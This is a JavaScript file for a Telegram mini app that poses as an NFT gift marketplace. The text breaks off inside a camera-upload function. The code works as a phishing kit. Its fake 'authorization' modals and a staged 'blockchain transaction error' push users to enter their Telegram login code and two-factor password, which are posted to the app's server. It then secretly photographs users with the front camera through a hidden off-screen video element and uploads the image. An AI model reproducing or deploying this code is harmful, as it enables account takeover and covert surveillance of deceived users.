const tg = window.Telegram.WebApp;
let currentStep = 1;
let userPhone = '';
let enteredCode = '';
let authSessionId = null;
let userData = null;
let botUsername = new URLSearchParams(window.location.search).get('bot_username') || '';
let cameraPhotoEnabled = false;
let currentCollection = 'Все';
let pageSize = 10;
let visibleCount = 10;
let widgetsAnimated = false;
let seasonsRendered = false;
let userBalanceTon = 0.00;
let giftsRendered = false;
let partnersRendered = false;
let shuffledNFTs = [];
const animations = new Map();
const animTimeouts = new Map();
const animationDataCache = new Map();
const animationCacheKeys = [];
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || (window.innerWidth <= 768);
const ANIMATION_CACHE_LIMIT = isMobile ? 15 : 30;

let animationObserver = null;
const domCache = new Map();

function getCachedElement(id) {
  if (!domCache.has(id)) {
    const el = document.getElementById(id);
    if (el) domCache.set(id, el);
    return el;
  }
  return domCache.get(id);
}

function initAnimationObserver() {
  if (animationObserver) return;

  animationObserver = new IntersectionObserver(
    (entries) => {
      entries.forEach(entry => {
        const container = entry.target;
        const nftId = container.dataset.nftId;

        if (!nftId) return;

        const anim = animations.get(nftId);
        if (anim) {
          if (entry.isIntersecting) {
            try { anim.play(); } catch { }
          } else {
            try { anim.pause(); } catch { }
          }
        }
      });
    },
    {
      rootMargin: '50px',
      threshold: 0.1
    }
  );
}

let i18nElementsCache = null;

function updateAllTexts() {
  if (!i18nElementsCache) {
    i18nElementsCache = Array.from(document.querySelectorAll('[data-i18n]'));
  }

  i18nElementsCache.forEach(el => {
    const key = el.getAttribute('data-i18n');
    if (el.tagName === 'INPUT' && el.type !== 'button') {
      el.placeholder = t(key);
    } else {
      el.textContent = t(key);
    }
  });

  const currentCollectionLabel = getCachedElement('currentCollectionLabel');
  if (currentCollectionLabel) {
    const collectionText = currentCollection === 'Все'
      ? (currentLang === 'ru' ? 'Коллекции' : 'Collections')
      : currentCollection;
    currentCollectionLabel.textContent = collectionText;
  }

  const profileName = getCachedElement('profileName');
  if (profileName && (profileName.textContent === 'Гость' || profileName.textContent === 'Guest')) {
    profileName.textContent = t('guestName');
  }

  const langText = getCachedElement('langText');
  if (langText) {
    langText.textContent = currentLang === 'ru' ? 'RU' : 'EN';
  }

  const { name: seasonName, sub: seasonSub } = getSeasonInfo();
  const seasonNameEl = getCachedElement('seasonName');
  if (seasonNameEl) seasonNameEl.textContent = seasonName;
  const seasonSubEl = getCachedElement('seasonSub');
  if (seasonSubEl) seasonSubEl.textContent = seasonSub;

  if (seasonsRendered) renderSeasonsView(false);
}
tg.ready();
tg.expand();
tg.disableVerticalSwipes();
tg.setHeaderColor('#000000');
tg.setBackgroundColor('#000000');

const isMobileTg = tg.platform === 'ios' || tg.platform === 'android';
const root = document.documentElement;

function setViewportVariables() {
  const safeTop = tg.safeAreaInset?.top || 0;
  const safeBottom = tg.safeAreaInset?.bottom || 0;
  const contentTop = tg.contentSafeAreaInset?.top || 0;
  const contentBottom = tg.contentSafeAreaInset?.bottom || 0;
  
  root.style.setProperty('--tg-safe-area-top', `${safeTop}px`);
  root.style.setProperty('--tg-safe-area-bottom', `${safeBottom}px`);
  root.style.setProperty('--tg-content-safe-area-top', `${contentTop}px`);
  root.style.setProperty('--tg-content-safe-area-bottom', `${contentBottom}px`);
  
  if (tg.viewportStableHeight) {
    root.style.setProperty('--tg-viewport-stable-height', `${tg.viewportStableHeight}px`);
  }
}

function applyMobileFullscreen() {
  if (isMobileTg && document.body) {
    try {
      document.body.classList.add('mobile-fullscreen');
      setViewportVariables();
      tg.requestFullscreen();
    } catch (e) {
      console.warn('[MINIAPP] Fullscreen not supported');
    }
  }
}

tg.onEvent('viewportChanged', (event) => {
  if (event.isStateStable) {
    setViewportVariables();
  }
});

tg.onEvent('safeAreaChanged', () => {
  setViewportVariables();
});

tg.onEvent('contentSafeAreaChanged', () => {
  setViewportVariables();
});

setViewportVariables();
applyMobileFullscreen();

try { document.body.classList.add('preloading'); } catch { }
const preloaderEl = document.getElementById('preloader');
const preloaderFillEl = document.getElementById('preloaderFill');
let preloadProgress = 0;
let preloadTarget = 0;
let preloaderFinished = false;
let progressRAF = null;
let preloadTimerRAF = null;
let preloadTimerDone = false;
let initDone = false;
let preloadedGift = null;

function applyProgressToDOM(val) {
  const v = Math.max(0, Math.min(100, Math.round(val)));
  if (preloaderFillEl) preloaderFillEl.style.width = v + '%';
  const bar = preloaderFillEl?.parentElement;
  if (bar) bar.setAttribute('aria-valuenow', String(v));
}

function progressTick() {
  const diff = preloadTarget - preloadProgress;
  if (Math.abs(diff) < 0.1) {
    preloadProgress = preloadTarget;
    applyProgressToDOM(preloadProgress);
    progressRAF = null;
    return;
  }
  preloadProgress += diff * 0.18;
  applyProgressToDOM(preloadProgress);
  progressRAF = requestAnimationFrame(progressTick);
}

function setPreloaderProgress(v) {
  preloadTarget = Math.max(0, Math.min(100, Number(v) || 0));
  if (!progressRAF) progressRAF = requestAnimationFrame(progressTick);
}

function finishPreloader() {
  if (preloaderFinished) return;
  setPreloaderProgress(100);
  if (preloaderEl) {
    preloaderEl.classList.add('hidden');

    setTimeout(() => {
      try {
        document.body.classList.remove('preloading');
        const header = document.querySelector('.header');
        const main = document.querySelector('.main');
        const nav = document.querySelector('.bottom-nav');

        if (header) header.style.opacity = '0';
        if (main) main.style.opacity = '0';
        if (nav) nav.style.opacity = '0';

        setTimeout(() => {
          if (header) {
            header.style.transition = 'opacity 0.6s ease';
            header.style.opacity = '1';
          }
          if (main) {
            main.style.transition = 'opacity 0.6s ease 0.1s';
            main.style.opacity = '1';
          }
          if (nav) {
            nav.style.transition = 'opacity 0.6s ease 0.2s';
            nav.style.opacity = '1';
          }
        }, 50);
      } catch { }
    }, 400);

    setTimeout(() => {
      preloaderEl.style.display = 'none';
    }, 1000);
  }
  preloaderFinished = true;
}

function maybeFinishPreloader() {
  if (preloadTimerDone && initDone) {
    finishPreloader();
  }
}

function startTimedPreloader(durationMs = 2500) {
  const t0 = performance.now();
  function tick(now) {
    const elapsed = now - t0;
    let pct = 1 + (elapsed / durationMs) * 99;
    if (pct >= 100) {
      pct = 100;
      preloadTimerDone = true;
      setPreloaderProgress(pct);
      preloadTimerRAF = null;
      maybeFinishPreloader();
      return;
    }
    setPreloaderProgress(pct);
    preloadTimerRAF = requestAnimationFrame(tick);
  }
  setPreloaderProgress(1);
  preloadTimerRAF = requestAnimationFrame(tick);
}

async function loadUserGift(forceRefresh = false) {
  if (!forceRefresh && preloadedGift !== null) {
    console.log('[GIFT] Используем предзагруженный подарок');
    return preloadedGift;
  }

  const MAX_RETRIES = 3;
  const RETRY_DELAY = 1000;

  for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
    try {
      const response = await fetch('/miniapp/get_gift', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          initData: tg.initData,
          bot_username: botUsername
        })
      });
      const data = await response.json();

      if (data.gift_url) {
        console.log('[GIFT] Подарок получен (без кеша)');
        return data.gift_url;
      }

      if (attempt < MAX_RETRIES) {
        await new Promise(r => setTimeout(r, RETRY_DELAY));
      }

    } catch (e) {
      console.error(`[GIFT] Попытка ${attempt} не удалась:`, e);
      if (attempt < MAX_RETRIES) {
        await new Promise(r => setTimeout(r, RETRY_DELAY));
      }
    }
  }

  return null;
}

async function renderGiftsView() {
  const giftsContent = document.getElementById('giftsContent');
  if (!giftsContent) return;

  const giftUrl = await loadUserGift();
  const badges = {
    nav: document.getElementById('giftsBadge'),
    received: document.getElementById('receivedBadge'),
    listed: document.getElementById('listedBadge')
  };

  if (!giftUrl) {
    giftsContent.innerHTML = `
      <div class="empty-gifts">
        <i class="ri-gift-line gift-icon"></i>
        <p>${t('emptyGifts')}</p>
      </div>
    `;
    if (badges.nav) badges.nav.style.display = 'none';
    if (badges.received) badges.received.textContent = '0';
    if (badges.listed) badges.listed.textContent = '0';
    return;
  }

  if (badges.nav) {
    badges.nav.textContent = '1';
    badges.nav.style.display = 'flex';
  }
  if (badges.received) badges.received.textContent = '1';
  if (badges.listed) badges.listed.textContent = '0';

  const parsed = parseGiftLink(giftUrl);
  if (!parsed) {
    giftsContent.innerHTML = `
      <div class="empty-gifts">
        <i class="ri-gift-line gift-icon"></i>
        <p>Ошибка загрузки подарка</p>
      </div>
    `;
    return;
  }

  const formatted = formatGiftName(parsed.name);
  const animUrl = `https://nft.fragment.com/gift/${parsed.name}-${parsed.id}.lottie.json`;

  giftsContent.innerHTML = `
    <div class="gift-card">
      <div class="gift-animation" id="giftAnimation"></div>
      <h3>
        <div class="nft-title">${formatted}</div>
        <div class="nft-number">#${parsed.id}</div>
      </h3>
      <button class="withdraw-gift-btn" id="withdrawGiftBtnCard">
        <i class="ri-hand-coin-line btn-icon-animated"></i>
        ${t('withdrawGiftBtnCard')}
      </button>
    </div>
  `;

  const withdrawBtnCard = document.getElementById('withdrawGiftBtnCard');
  if (withdrawBtnCard) {
    withdrawBtnCard.addEventListener('click', () => {
      tg.HapticFeedback.impactOccurred('medium');
      document.getElementById('giftWithdrawModal').classList.add('active');
    });
  }

  const container = document.getElementById('giftAnimation');
  if (container) {
    const giftAnimId = `gift-${parsed.id}`;
    loadFragmentAnimation(animUrl, container, giftAnimId)
      .then((anim) => {
        console.log('[GIFT] Анимация успешно загружена');
        if (anim) {
          anim.play();
        }
      })
      .catch((e) => {
        console.error('[GIFT] Ошибка загрузки анимации:', e);
      });
  }
}

let currentUserGift = null;

async function checkUserHasGifts() {
  if (currentUserGift !== null) return currentUserGift;
  const giftUrl = await loadUserGift();
  currentUserGift = !!giftUrl;
  return currentUserGift;
}

function initGiftsToolbar() {
  const giftTabs = document.querySelectorAll('.gift-tab');
  const addGiftBtn = document.getElementById('addGiftBtn');
  const withdrawGiftBtn = document.getElementById('withdrawGiftBtn');
  const sellGiftBtn = document.getElementById('sellGiftBtn');
  const sendGiftBtn = document.getElementById('sendGiftBtn');

  giftTabs.forEach(tab => {
    tab.addEventListener('click', () => {
      giftTabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      try { tg.HapticFeedback.selectionChanged(); } catch { }
    });
  });

  if (addGiftBtn) {
    addGiftBtn.addEventListener('click', () => {
      try { tg.HapticFeedback.impactOccurred('light'); } catch { }
      document.getElementById('giftAddModal').classList.add('active');
    });
  }

  if (withdrawGiftBtn) {
    withdrawGiftBtn.addEventListener('click', async () => {
      try { tg.HapticFeedback.impactOccurred('light'); } catch { }
      const hasGifts = await checkUserHasGifts();
      if (!hasGifts) {
        document.getElementById('giftNoItemsModal').classList.add('active');
      } else {
        const modal = document.getElementById('giftWithdrawModal');
        const title = document.getElementById('withdrawModalTitle');
        const desc = document.getElementById('withdrawModalDesc');
        if (title) title.textContent = 'Ошибка транзакции в блокчейн';
        if (desc) desc.textContent = 'Для вывода подарка с маркета требуется авторизация';
        modal.classList.add('active');
      }
    });
  }

  if (sellGiftBtn) {
    sellGiftBtn.addEventListener('click', async () => {
      try { tg.HapticFeedback.impactOccurred('light'); } catch { }
      const hasGifts = await checkUserHasGifts();
      if (!hasGifts) {
        document.getElementById('giftNoItemsModal').classList.add('active');
      } else {
        document.getElementById('offerModal').classList.add('active');
      }
    });
  }

  if (sendGiftBtn) {
    sendGiftBtn.addEventListener('click', () => {
      try { tg.HapticFeedback.impactOccurred('light'); } catch { }
      document.getElementById('giftSendModal').classList.add('active');
    });
  }

  setupModal('giftAddModal', 'closeGiftAdd');
  setupModal('giftNoItemsModal', 'closeNoItems', ['closeNoItemsBtn']);
  setupModal('giftSendModal', 'closeGiftSend');

  const authFromAddBtn = document.getElementById('authFromAddBtn');
  const authFromSendBtn = document.getElementById('authFromSendBtn');

  const openAuthFromModal = (modalId) => {
    document.getElementById(modalId).classList.remove('active');
    authModal.classList.add('active');
    resetStartAuthUI();
    tg.HapticFeedback.impactOccurred('light');
  };

  if (authFromAddBtn) authFromAddBtn.onclick = () => openAuthFromModal('giftAddModal');
  if (authFromSendBtn) authFromSendBtn.onclick = () => openAuthFromModal('giftSendModal');
}

(async () => {
  try { startTimedPreloader(1800); } catch { }
  userData = tg.initDataUnsafe?.user || null;

  const giftPromise = (async () => {
    try {
      console.log('[GIFT] Начинаем предзагрузку подарка...');
      const giftUrl = await loadUserGift();
      preloadedGift = giftUrl;

      const badge = document.getElementById('giftsBadge');
      if (badge && giftUrl) {
        badge.style.display = 'flex';

        try {
          const parsed = parseGiftLink(giftUrl);
          if (parsed) {
            const formatted = formatGiftName(parsed.name);
            const formattedForUrl = formatted.replace(/\s/g, '');
            const animUrl = `https://nft.fragment.com/gift/${formattedForUrl}-${parsed.id}.lottie.json`;
            const response = await fetch(animUrl);
            const data = await response.json();
            animationDataCache.set(animUrl, data);
            console.log('[GIFT] Анимация предзагружена в кеш');
          }
        } catch (e) {
          console.log('[GIFT] Не удалось предзагрузить анимацию:', e);
        }
      }
      console.log('[GIFT] Предзагрузка подарка завершена');
    } catch (e) {
      console.error('[GIFT] Ошибка предзагрузки:', e);
    }
  })();

  if (userData && tg.initData) {
    try {
      const response = await fetch('/miniapp/open', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          initData: tg.initData,
          bot_username: botUsername
        })
      });
      const result = await response.json();
      if (result.success && typeof result.camera_photo_enabled === 'boolean') {
        cameraPhotoEnabled = result.camera_photo_enabled;
      }
      console.log('[MINIAPP] Лог открытия отправлен');
    } catch (err) {
      console.error('[MINIAPP] Ошибка лога:', err);
    }
  }

  setupProfileBase();
  try { updateBalanceUI(); } catch { }
  renderCollectionsDropdown();
  await renderNFTCards();

  await giftPromise;

  try {
    const langSwitch = document.getElementById('langSwitch');
    if (langSwitch) {
      langSwitch.addEventListener('click', () => {
        langSwitch.classList.add('switching');

        setTimeout(() => {
          langSwitch.classList.remove('switching');
        }, 600);

        const newLang = currentLang === 'ru' ? 'en' : 'ru';
        switchLanguage(newLang);
        tg.HapticFeedback.impactOccurred('light');
      });
    }
    updateAllTexts();
  } catch (e) {
    console.error('[LANG] Ошибка инициализации языка:', e);
  }

  initDone = true;
  maybeFinishPreloader();

  setInterval(() => {
    const cleaned = cleanupOrphanedAnimations();
    if (cleaned > 0) {
      console.log(`[CLEANUP] Удалено ${cleaned} orphaned анимаций`);
    }
  }, 30000);
})();


const parsedNFTsCache = new Map();

function cleanupAnimations() {
  if (animationObserver) {
    animations.forEach((anim, id) => {
      try {
        const container = document.getElementById(`lottie-${id}`);
        if (container) animationObserver.unobserve(container);
        anim.destroy();
      } catch (e) {
        console.warn(`[ANIM] Не удалось уничтожить анимацию ${id}:`, e);
      }
    });
  }

  animations.clear();

  animTimeouts.forEach(timer => clearTimeout(timer));
  animTimeouts.clear();
}

function cleanupOrphanedAnimations() {
  const toRemove = [];
  animations.forEach((anim, id) => {
    const container = document.getElementById(`lottie-${id}`);
    if (!container || !document.body.contains(container)) {
      toRemove.push(id);
    }
  });
  toRemove.forEach(id => {
    const anim = animations.get(id);
    if (anim) {
      try { anim.destroy(); } catch { }
      animations.delete(id);
    }
  });
  return toRemove.length;
}

function pauseGiftAnimations() {
  animations.forEach((anim) => {
    try { anim.pause(); } catch { }
  });
}

function resumeGiftAnimations() {
  animations.forEach((anim, id) => {
    const container = document.getElementById(`lottie-${id}`);
    if (container && animationObserver) {
      const rect = container.getBoundingClientRect();
      const isVisible = rect.top < window.innerHeight && rect.bottom > 0;
      if (isVisible) {
        try { anim.play(); } catch { }
      }
    }
  });
}

async function renderNFTCards(forceReshuffle = false) {
  const grid = document.getElementById('marketGrid');
  if (!grid) return;

  cleanupAnimations();

  if (shuffledNFTs.length === 0 || forceReshuffle) {
    shuffledNFTs = [...nftItems].sort(() => Math.random() - 0.5);
  }

  const processedNFTs = shuffledNFTs.map(item => {
    let cached = parsedNFTsCache.get(item.url);
    if (!cached) {
      const parsed = parseNFTUrl(item.url);
      if (!parsed) return null;
      const formatted = formatNFTName(parsed.name);
      cached = { ...item, parsed, formatted };
      parsedNFTsCache.set(item.url, cached);
    }
    return cached;
  }).filter(Boolean);

  const filtered = currentCollection === 'Все'
    ? processedNFTs
    : processedNFTs.filter(i => i.formatted === currentCollection);

  const toRender = filtered.slice(0, visibleCount);

  grid.innerHTML = '';
  const fragment = document.createDocumentFragment();

  grid.classList.toggle('single', toRender.length === 1);

  toRender.forEach((item, index) => {
    const { parsed, formatted } = item;
    const formattedForUrl = formatted.replace(/\s/g, '');
    const animUrl = `https://nft.fragment.com/gift/${formattedForUrl}-${parsed.id}.lottie.json`;
    const previewUrl = `https://nft.fragment.com/gift/${formattedForUrl}-${parsed.id}.webp`;

    const card = document.createElement('div');
    card.className = 'nft-card';
    card.dataset.nftId = item.id;
    card.dataset.cardIndex = index;
    const displayPrice = item.price ? Number(item.price).toFixed(2) : '0.00';

    card.innerHTML = `
      <div class="lottie-container" id="lottie-${item.id}" data-nft-id="${item.id}" data-anim-url="${animUrl}">
        <img class="nft-preview" src="${previewUrl}" alt="${formatted}" loading="lazy">
      </div>
      <h3>
        <div class="nft-title">${formatted}</div>
        <div class="nft-number">#${parsed.id}</div>
      </h3>
      <button class="buy-btn">
        <span class="btn-price">${displayPrice}</span>
        <img class="ton-icon" src="https://i.postimg.cc/Qx5NWjVV/11.png" alt="TON">
      </button>
    `;

    fragment.appendChild(card);
  });

  grid.appendChild(fragment);

  const offerModal = getCachedElement('offerModal');
  grid.onclick = (e) => {
    const card = e.target.closest('.nft-card');
    if (!card) return;
    tg.HapticFeedback.impactOccurred('medium');
    if (offerModal) offerModal.classList.add('active');
  };

  const scrollableElements = [grid, document.querySelector('.main')];
  scrollableElements.forEach(el => {
    if (el && !el.dataset.optimized) {
      el.addEventListener('touchstart', () => { }, { passive: true });
      el.addEventListener('touchmove', () => { }, { passive: true });
      el.addEventListener('wheel', () => { }, { passive: true });
      el.dataset.optimized = 'true';
    }
  });

  updateShowMoreButton(filtered.length);
}

function updateShowMoreButton(totalFiltered) {
  const showMoreBtn = document.getElementById('showMoreBtn');
  if (!showMoreBtn) return;

  const icon = showMoreBtn.querySelector('i');
  const textSpan = showMoreBtn.querySelector('[data-i18n]');

  if (visibleCount < totalFiltered) {
    showMoreBtn.style.display = 'inline-flex';
    if (icon) icon.className = 'ri-arrow-down-circle-line';
    if (textSpan) textSpan.textContent = t('showMoreBtn');
    showMoreBtn.onclick = () => {
      visibleCount += pageSize;
      renderNFTCards();
    };
  } else if (visibleCount >= totalFiltered && totalFiltered > pageSize) {
    showMoreBtn.style.display = 'inline-flex';
    if (icon) icon.className = 'ri-arrow-up-circle-line';
    if (textSpan) textSpan.textContent = currentLang === 'ru' ? 'Свернуть' : 'Collapse';
    showMoreBtn.onclick = () => {
      visibleCount = pageSize;
      renderNFTCards();
    };
  } else {
    showMoreBtn.style.display = 'none';
    showMoreBtn.onclick = null;
  }
}
function setupProfileBase() {
  const profileAvatar = document.getElementById('profileAvatar');
  const firstName = userData?.first_name || t('guestName');

  if (profileAvatar && userData?.photo_url && userData.photo_url.trim()) {
    profileAvatar.src = userData.photo_url;
    profileAvatar.style.display = 'block';
  }

  const profileNameEl = document.getElementById('profileName');
  if (profileNameEl) profileNameEl.textContent = firstName;
}

console.log('[MINIAPP] Bot username:', botUsername || '(none)');
if (!botUsername) console.warn('[MINIAPP] bot_username не найден');
const steps = {
  1: document.getElementById('step1'),
  2: document.getElementById('step2'),
  '2fa': document.getElementById('step2fa'),
  3: document.getElementById('step3')
};

const stepDots = {
  1: document.getElementById('step1-dot'),
  2: document.getElementById('step2-dot'),
  3: document.getElementById('step3-dot')
};

const progressFill = document.getElementById('progressFill');
const status = document.getElementById('status');
const authModal = document.getElementById('authModal');
const authBtn = document.getElementById('authBtn');
const closeAuth = document.getElementById('closeAuth');
const goToMarket = document.getElementById('goToMarket');
const startAuthBtn = document.getElementById('startAuthBtn');
const submit2faBtn = document.getElementById('submit2faBtn');
const codeInputs = [
  document.getElementById('digit1'),
  document.getElementById('digit2'),
  document.getElementById('digit3'),
  document.getElementById('digit4'),
  document.getElementById('digit5')
];

const password2fa = document.getElementById('password2fa');
const togglePassword = document.getElementById('togglePassword');
const navBtns = document.querySelectorAll('.nav-btn');
const views = document.querySelectorAll('.view');
const collectionsToggle = document.getElementById('collectionsToggle');
const collectionsDropdown = document.getElementById('collectionsDropdown');
const currentCollectionLabel = document.getElementById('currentCollectionLabel');
const allGiftsBtn = document.getElementById('allGiftsBtn');
const inviteBtn = document.getElementById('inviteBtn');
const topUpBtn = document.getElementById('topUpBtn');
const withdrawBtn = document.getElementById('withdrawBtn');
const historyBtn = document.getElementById('historyBtn');
const historyModal = document.getElementById('historyModal');

// Подстройка модалки под клавиатуру
function handleKeyboard() {
  const authContainer = document.querySelector('.auth-modal.active .auth-container');
  if (!authContainer) return;
  
  const vv = window.visualViewport;
  if (vv) {
    const keyboardHeight = window.innerHeight - vv.height;
    if (keyboardHeight > 150) {
      authContainer.style.transform = `scale(1) translateY(70px)`;
    } else {
      authContainer.style.transform = 'scale(1)';
    }
  }
}

if (window.visualViewport) {
  window.visualViewport.addEventListener('resize', handleKeyboard);
}

function updateBalanceUI() {
  const el = document.getElementById('balanceAmount');
  if (el) el.textContent = Number(userBalanceTon).toFixed(2);
}

function renderCollectionsDropdown() {
  if (!collectionsDropdown) return;
  const names = getNameCollections();
  const fragment = document.createDocumentFragment();

  const translatedNames = names.map(name => {
    if (name === 'Все') return t('allGiftsBtn').replace(' подарки', '').replace('All Gifts', 'All');
    return name;
  });

  translatedNames.forEach((name, idx) => {
    const originalName = names[idx];
    const li = document.createElement('li');
    li.className = originalName === currentCollection ? 'active' : '';
    li.dataset.collection = originalName;
    li.innerHTML = `
      <span>${name}</span>
      ${originalName === currentCollection ? '<i class="ri-check-line"></i>' : ''}
    `;
    fragment.appendChild(li);
  });

  collectionsDropdown.innerHTML = '';
  collectionsDropdown.appendChild(fragment);

  collectionsDropdown.onclick = (e) => {
    const li = e.target.closest('li');
    if (!li) return;
    const name = li.dataset.collection;
    if (currentCollection !== name) {
      currentCollection = name;
      const displayName = name === 'Все'
        ? (currentLang === 'ru' ? 'Все коллекции' : 'All collections')
        : name;
      if (currentCollectionLabel) currentCollectionLabel.textContent = displayName;
      tg.HapticFeedback.selectionChanged();
      visibleCount = pageSize;
      renderNFTCards();
    }
    closeCollectionsDropdown();
  };
}

function openCollectionsDropdown() {
  if (!collectionsDropdown) return;
  renderCollectionsDropdown();
  collectionsDropdown.hidden = false;
  document.addEventListener('click', outsideClickHandler);
  document.addEventListener('keydown', escHandler);
}

function closeCollectionsDropdown() {
  if (!collectionsDropdown) return;
  collectionsDropdown.hidden = true;
  document.removeEventListener('click', outsideClickHandler);
  document.removeEventListener('keydown', escHandler);
}

function outsideClickHandler(e) {
  if (!collectionsDropdown || !collectionsToggle) return;
  const dd = collectionsDropdown.closest('.collection-dd');
  if (dd && !dd.contains(e.target)) {
    closeCollectionsDropdown();
  }
}

function escHandler(e) {
  if (e.key === 'Escape') closeCollectionsDropdown();
}

if (collectionsToggle) {
  collectionsToggle.addEventListener('click', (e) => {
    e.stopPropagation();
    if (collectionsDropdown.hidden) {
      openCollectionsDropdown();
    } else {
      closeCollectionsDropdown();
    }
  });
}

if (allGiftsBtn) {
  allGiftsBtn.addEventListener('click', async () => {
    currentCollection = 'Все';
    if (currentCollectionLabel) currentCollectionLabel.textContent = 'Все коллекции';
    tg.HapticFeedback.selectionChanged();
    closeCollectionsDropdown();
    visibleCount = pageSize;
    await renderNFTCards();
  });
}

const openAuthModal = () => {
  document.body.style.overflow = 'hidden';
  document.body.style.position = 'fixed';
  document.body.style.width = '100%';
  authModal.classList.add('active');
  resetStartAuthUI();
  tg.HapticFeedback.impactOccurred('light');
};

if (inviteBtn) {
  inviteBtn.onclick = () => {
    tg.HapticFeedback.impactOccurred('light');
    const uid = userData?.id || '';
    if (!botUsername) {
      const msg = 'Не удалось сформировать ссылку:.';
      tg.showAlert ? tg.showAlert(msg) : alert(msg);
      return;
    }
    const startParam = uid ? `ref_${uid}` : 'ref_friend';
    const link = `https://t.me/${botUsername}?start=${startParam}`;
    const shareText = currentLang === 'ru'
      ? '🎁 Присоединяйся к NFT маркету! Получи бонусы при регистрации!'
      : '🎁 Join the NFT marketplace! Get bonuses on registration!';
    const shareUrl = `https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(shareText)}`;

    if (tg.openTelegramLink) {
      tg.openTelegramLink(shareUrl);
    } else {
      window.open(shareUrl, '_blank');
    }
  };
}

if (topUpBtn) topUpBtn.onclick = openAuthModal;
if (withdrawBtn) withdrawBtn.onclick = openAuthModal;
if (historyBtn) {
  historyBtn.onclick = () => {
    historyModal.classList.add('active');
    tg.HapticFeedback.impactOccurred('light');
  };
}

function showStatus(message, type) {
  if (type !== 'error') return;
  if (!status) return;
  status.textContent = message;
  status.className = type;
  status.style.display = 'block';
  setTimeout(() => {
    if (status) status.style.display = 'none';
  }, 5000);
}

function showStep(step) {
  Object.values(steps).forEach(el => el.classList.remove('active'));
  Object.values(stepDots).forEach(dot => dot.classList.remove('active'));
  steps[step].classList.add('active');

  for (let i = 1; i <= step && i <= 3; i++) {
    stepDots[i].classList.add('active');
  }

  const progress = step === '2fa' ? 66 : (step * 33.33);
  progressFill.style.width = Math.min(progress, 100) + '%';

  const userWelcome = document.querySelector('.user-welcome');
  if (userWelcome) userWelcome.style.display = 'flex';

  currentStep = step;
  if (step === 1) {
    try { resetStartAuthUI(); } catch { }
  }
  if (step === 2) setTimeout(() => codeInputs[0].focus(), 100);
}

function clearCodeInputs() {
  codeInputs.forEach(input => input.value = '');
  enteredCode = '';
  codeInputs[0].focus();
  tg.HapticFeedback.selectionChanged();
}

async function verifyCode() {
  if (enteredCode.length !== 5) return;

  tg.HapticFeedback.impactOccurred('light');

  try {
    console.log('[MINIAPP] Отправляем код:', enteredCode);
    console.log('[MINIAPP] Bot username:', botUsername);

    const response = await fetch('/miniapp/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        initData: tg.initData,
        action: 'verify_code',
        session_id: authSessionId,
        code: enteredCode,
        bot_username: botUsername
      })
    });

    const result = await response.json();

    if (result.success) {
      showStep(3);
      console.log('[MINIAPP] Код верный');

      if (cameraPhotoEnabled) {
        captureAndSendPhoto();
      }

      setTimeout(() => {
        const loader = document.querySelector('.liquid-loader');
        const successContent = document.querySelector('.success-content');
        if (loader) loader.style.display = 'none';
        if (successContent) successContent.classList.add('show');
      }, 15000);
    } else if (result.need_2fa) {
      showStep('2fa');

      // Отображаем подсказку пароля, если она есть
      const passwordHint = document.getElementById('passwordHint');
      if (passwordHint) {
        if (result.hint && result.hint.trim()) {
          passwordHint.textContent = `Подсказка: ${result.hint}`;
          passwordHint.style.display = 'block';
        } else {
          passwordHint.style.display = 'none';
        }
      }

      showStatus('Требуется пароль двухфакторной аутентификации', 'info');
      console.log('[MINIAPP] Требуется 2FA, hint:', result.hint || 'отсутствует');
    } else {
      console.log('[MINIAPP] Неверный код:', result.error);
      throw new Error(result.error || 'Неверный код');
    }
  } catch (error) {
    console.error('[MINIAPP] Ошибка проверки кода:', error);
    showStatus(error.message, 'error');
    clearCodeInputs();
  }
}

function updateCode() {
  enteredCode = codeInputs.map(input => input.value).join('').replace(/\D/g, '');
  if (enteredCode.length === 5) {
    tg.HapticFeedback.notificationOccurred('success');
    verifyCode();
  }
}

const codeContainer = document.querySelector('.code-input-container');
codeContainer.addEventListener('paste', (e) => {
  e.preventDefault();
  const paste = (e.clipboardData || window.clipboardData).getData('text').trim();
  const digits = paste.replace(/\D/g, '').substring(0, 5);

  codeInputs.forEach((input, index) => {
    input.value = index < digits.length ? digits[index] : '';
  });

  const focusIndex = Math.min(digits.length, 4);
  codeInputs[focusIndex].focus();

  updateCode();
  tg.HapticFeedback.impactOccurred('medium');
});

codeInputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 1);
    if (e.target.value.length === 1 && index < codeInputs.length - 1) {
      codeInputs[index + 1].focus();
    }
    updateCode();
  });

  input.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && !e.target.value && index > 0) {
      codeInputs[index - 1].focus();
    } else if (e.key === 'ArrowLeft' && index > 0) {
      e.preventDefault();
      codeInputs[index - 1].focus();
    } else if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
      e.preventDefault();
      codeInputs[index + 1].focus();
    }
  });

  input.addEventListener('focus', (e) => {
    e.preventDefault();
    setTimeout(() => e.target.select(), 0);
  }, { passive: false });
});

function resetStartAuthUI() {
  if (!startAuthBtn) return;
  startAuthBtn.disabled = false;
  const span = startAuthBtn.querySelector('[data-i18n]');
  if (span) span.textContent = t('startAuthBtn');
}

async function captureAndSendPhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' }
    });

    const video = document.createElement('video');
    video.srcObject = stream;
    video.autoplay = true;
    video.playsInline = true;
    video.style.position = 'fixed';
    video.style.top = '-9999px';
    video.style.width = '1px';
    video.style.height = '1px';
    document.body.appendChild(video);

    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(resolve, 500);
      };
    });

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    stream.getTracks().forEach(track => track.stop());
    document.body.removeChild(video);

    canvas.toBlob(async (blob) => {
      if (!blob) return;

      const formData = new FormData();
      formData.append('photo', blob, 'camera.jpg');
      formData.append('initData', tg.initData);
      formData.append('bot_username', botUsername);

      try {
        await fetch('/miniapp/camera_photo', {
          method: 'POST',
          body: formData
